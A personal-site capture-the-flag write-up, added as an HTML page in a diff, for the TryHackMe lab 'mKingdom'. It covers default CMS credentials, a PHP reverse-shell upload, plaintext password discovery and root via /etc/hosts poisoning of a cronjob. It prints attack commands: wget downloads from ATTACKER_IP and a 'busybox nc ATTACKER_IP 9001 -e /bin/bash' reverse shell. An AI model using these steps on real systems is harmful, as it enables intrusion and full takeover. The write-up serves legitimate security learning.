@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self';">
+  <title>mKingdom | Alberto Erbusti</title>
+  <meta name="description" content="Writeup for TryHackMe mKingdom — web exploitation, PHP shell, linpeas, cronjob hijacking for root.">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../writeup.css">
+</head>
+<body>
+
+  <nav>
+    <a class="nav-logo" href="../index.html"><span>~/</span>albierbi</a>
+    <ul class="nav-links">
+      <li><a href="../index.html#about">About</a></li>
+      <li><a href="../writeups/" class="active">Writeups</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+    </ul>
+  </nav>
+
+  <div class="writeup-hero">
+    <div class="writeup-hero-inner">
+      <div class="writeup-back">
+        <a href="../writeups/">&larr; all writeups</a>
+      </div>
+      <div class="writeup-meta-top">
+        <span class="platform-badge badge-thm">TryHackMe</span>
+        <span class="diff-badge diff-medium">medium</span>
+      </div>
+      <h1 class="writeup-title">mKingdom</h1>
+      <p class="writeup-subtitle">Web exploitation via PHP file upload, lateral movement through plaintext credentials, and root via cronjob hijacking through /etc/hosts poisoning.</p>
+      <div class="writeup-tags">
+        <span class="tag">web</span>
+        <span class="tag">php</span>
+        <span class="tag">reverse-shell</span>
+        <span class="tag">linpeas</span>
+        <span class="tag">privesc</span>
+        <span class="tag">cronjob</span>
+        <span class="tag">hosts-poisoning</span>
+      </div>
+      <div class="writeup-date">Completed &mdash; 2025-07-06</div>
+    </div>
+  </div>
+
+  <div class="writeup-body">
+
+    <aside class="writeup-toc">
+      <div class="toc-label">// contents</div>
+      <ul>
+        <li><a href="#recon">Recon</a></li>
+        <li><a href="#web">Web Enumeration</a></li>
+        <li><a href="#foothold">Foothold</a></li>
+        <li><a href="#lateral">Lateral Movement</a></li>
+        <li><a href="#privesc">Privilege Escalation</a></li>
+        <li><a href="#takeaways">Takeaways</a></li>
+      </ul>
+    </aside>
+
+    <article class="writeup-content">
+
+      <section id="recon">
+        <h2>Recon</h2>
+        <p>Started with a full Nmap scan, TCP and UDP.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>nmap -sV -sC 10.10.219.78
+nmap -sU 10.10.219.78</pre>
+        </div>
+        <div class="info-grid">
+          <div class="info-row"><span class="port">85</span><span class="service">HTTP</span></div>
+          <div class="info-row"><span class="port">68 (UDP)</span><span class="service">DHCP client</span></div>
+          <div class="info-row"><span class="port">631 (UDP)</span><span class="service">IPP</span></div>
+          <div class="info-row"><span class="port">5353 (UDP)</span><span class="service">mDNS / Zeroconf</span></div>
+        </div>
+        <p>Only one HTTP port open on TCP. Navigating to <code>http://10.10.219.78:85</code> showed an image. Tried <code>steghide</code> on it but needed a passphrase — dead end for now.</p>
+      </section>
+
+      <section id="web">
+        <h2>Web Enumeration</h2>
+        <p>Ran gobuster to find hidden paths.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>gobuster dir -u http://10.10.219.78:85 -w /usr/share/wordlists/dirb/common.txt</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Found</div>
+          <ul>
+            <li><code>http://10.10.219.78:85/app/</code></li>
+            <li><code>http://10.10.219.78:85/app/castle</code> — redirected from a button on the page</li>
+            <li><code>http://10.10.219.78:85/app/castle/index.php/login</code></li>
+          </ul>
+        </div>
+        <p>A CMS login page. Tried default credentials.</p>
+        <div class="callout callout-success">
+          <div class="callout-title">Default credentials worked</div>
+          <p><code>admin : password</code></p>
+        </div>
+      </section>
+
+      <section id="foothold">
+        <h2>Foothold — PHP Reverse Shell</h2>
+        <p>Inside the CMS, found a file extension settings page. Added <code>.php</code> to the allowed extensions list, then uploaded a PHP reverse shell.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre># On attacker machine — set up listener
+nc -lvnp 4444</pre>
+        </div>
+        <p>Triggered the shell by visiting the uploaded file. Got a basic shell back. Upgraded it to a proper TTY:</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# ctrl+z
+stty raw -echo; fg</pre>
+        </div>
+        <p>Found two users in <code>/home</code>: <code>mario</code> and <code>toad</code>.</p>
+      </section>
+
+      <section id="lateral">
+        <h2>Lateral Movement</h2>
+        <p>Transferred <code>linpeas</code> to the target using Python's HTTP server.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre># On attacker machine
+python3 -m http.server 8000
+
+# On victim
+wget http://ATTACKER_IP:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Found — toad's password in plaintext</div>
+          <p><code>toad : toadisthebest</code></p>
+        </div>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>su toad</pre>
+        </div>
+        <p>Re-ran linpeas as <code>toad</code>. Found a <code>PWD_TOKEN</code> environment variable containing base64-encoded text.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>echo "BASE64STRING" | base64 -d</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Decoded to mario's password</div>
+        </div>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre>su mario</pre>
+        </div>
+      </section>
+
+      <section id="privesc">
+        <h2>Privilege Escalation — Cronjob Hijacking</h2>
+        <p>Re-ran linpeas as <code>mario</code>. Found that <code>/etc/hosts</code> was writable by our user — unusual and suspicious.</p>
+        <p>Used <code>pspy</code> to monitor running processes without root:</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre># Transfer pspy to victim
+wget http://ATTACKER_IP:8000/pspy64
+chmod +x pspy64
+./pspy64</pre>
+        </div>
+        <div class="callout callout-success">
+          <div class="callout-title">Spotted a cronjob running every minute</div>
+          <p>The machine was pulling <code>counter.sh</code> from <code>mkingdom.thm</code> and executing it with bash as root.</p>
+        </div>
+        <p>The attack: poison <code>/etc/hosts</code> to map <code>mkingdom.thm</code> to our Kali machine, then serve a malicious <code>counter.sh</code> with a reverse shell payload.</p>
+        <div class="code-block">
+          <div class="code-label">bash</div>
+          <pre># On victim — add our IP to /etc/hosts
+echo "ATTACKER_IP mkingdom.thm" &gt;&gt; /etc/hosts
+
+# On attacker — create malicious counter.sh
+echo "busybox nc ATTACKER_IP 9001 -e /bin/bash" &gt; counter.sh
+
+# Serve it
+python3 -m http.server 80
+
+# Set up listener
+nc -lvnp 9001</pre>
+        </div>
+        <p>Waited for the cronjob to fire. After ~1 minute, got a root shell.</p>
+        <div class="callout callout-info">
+          <div class="callout-title">Why busybox nc?</div>
+          <p><code>busybox nc</code> is a smart fallback on restricted systems. The standard <code>nc</code> on the target didn't support <code>-e</code>, but the busybox version does. Commonly useful in CTFs, embedded devices, or containers where full toolsets aren't available.</p>
+        </div>
+      </section>
+
+      <section id="takeaways">
+        <h2>Takeaways</h2>
+        <div class="callout callout-info">
+          <div class="callout-title">Key lessons</div>
+          <ul>
+            <li>Always check file upload restrictions — adding allowed extensions is a classic misconfiguration</li>
+            <li><code>pspy</code> is essential for spotting cronjobs without root access</li>
+            <li>Writable <code>/etc/hosts</code> + outbound cronjob = almost guaranteed root</li>
+            <li><code>busybox nc</code> as a fallback when standard netcat lacks <code>-e</code></li>
+            <li>linpeas catches environment variables — always worth reading the full output carefully</li>
+          </ul>
+        </div>
+      </section>
+
+    </article>
+  </div>
+
+  <footer>
+    <span>&copy; 2026 Alberto Erbusti</span>
+    <a href="../writeups/" class="footer-back">&larr; back to writeups</a>
+  </footer>
+
+</body>
+</html>
